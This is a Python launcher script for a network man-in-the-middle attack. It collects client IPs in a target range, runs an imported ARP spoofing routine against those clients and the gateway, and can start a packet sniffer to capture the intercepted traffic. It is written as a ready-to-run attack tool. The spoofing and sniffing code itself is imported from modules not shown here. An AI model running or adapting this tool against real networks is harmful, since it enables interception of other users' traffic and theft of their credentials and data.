from ClientList import *
from ArpSpoof import *
import subprocess
import argparse


class Setup:

    def __init__(self):
        pass

    @staticmethod
    def get_arguments():
        parser = argparse.ArgumentParser()
        parser.add_argument("--target-ip", "-t", dest="Target", help="Target IP")
        parser.add_argument("--sniff", "-s", dest="Sniff", help="To run sniffer", action="store_true")
        parser.add_argument("--gateway-ip", "-g", dest="Gateway", help="Gateway IP")
        parser.add_argument("--interface", "-i", dest="Interface", help="Interface")
        option = parser.parse_args()
        if not option.Target:
            print("[-] Target ip missing. Type --help for more information")
            exit()
        if not option.Gateway:
            print("[-] Gateway ip missing. Type --help for more information")
        if not option.Interface:
            print("[-] Interface is missing. Type --help for more information")
        return option


    def call(self):
        option = self.get_arguments()
        obj_client_list = ClientList()
        ip_list = obj_client_list.list_ips(option.Target)
        obj_arp_spoof = ArpSpoof()
        print("[+] Arp spoof is running for following clients ->", *ip_list, end=",\n")
        if not option.Sniff:
            print("[-] Sniffer not running. Use --help for more information")
        else:
            print("[+] Sniffer is running.")
            subprocess.Popen(["python3", "PacketSniffer.py", "-i", option.Interface])
        obj_arp_spoof.run(ip_list, option.Gateway)


obj_setup = Setup()
obj_setup.call()
